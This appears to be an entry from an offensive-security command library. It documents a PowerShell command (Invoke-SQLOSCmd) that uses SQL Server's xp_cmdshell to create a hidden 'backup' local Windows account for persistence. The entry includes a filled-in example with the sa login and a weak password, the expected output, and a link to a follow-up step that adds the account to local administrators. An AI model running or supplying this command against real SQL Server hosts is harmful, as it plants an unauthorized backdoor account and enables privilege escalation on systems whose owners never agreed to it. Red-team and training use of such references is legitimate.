---
type: command
executor: powershell
data: >-
  Invoke-SQLOSCmd -Username $_USERNAME -Password $_PASSWORD -Instance
  "$_INSTANCE" -Command "net user backup $_USER_PASSWORD /add" -Verbose
output: null
platforms:
  - Windows
  - SQL Server
tags:
  - persistence
  - privilege-escalation
  - command-execution
verified: true
validated: true
---

# invoke-sqloscmd-create-local-user-backup

## Command

```powershell
Invoke-SQLOSCmd -Username $_USERNAME -Password $_PASSWORD -Instance "$_INSTANCE" -Command "net user backup $_USER_PASSWORD /add" -Verbose
```

## Description

This command creates a local Windows user account named 'backup' with a specified password on the SQL Server host using xp_cmdshell, establishing persistence.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Username | SQL Server login username | Yes |
| -Password | SQL Server login password | Yes |
| -Instance | SQL Server instance name | Yes |
| -Command | OS command (net user ... /add) | Yes |
| $_USER_PASSWORD | Password for the new user | Yes |
| -Verbose | Enable detailed output | No |

## Examples

### Basic Usage

```powershell
Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "DBSERVER\SQLEXPRESS" -Command "net user backup Password1234 /add" -Verbose
```

## Expected Output

```
The command completed successfully.
```

If failed: "Access denied" or user already exists.

## Related

- [[procedures/mssql-command-execution-via-xp-cmdshell-with-invoke-sqloscmd]]
- [[commands/invoke-sqloscmd-add-user-backup-to-local-administrators]]
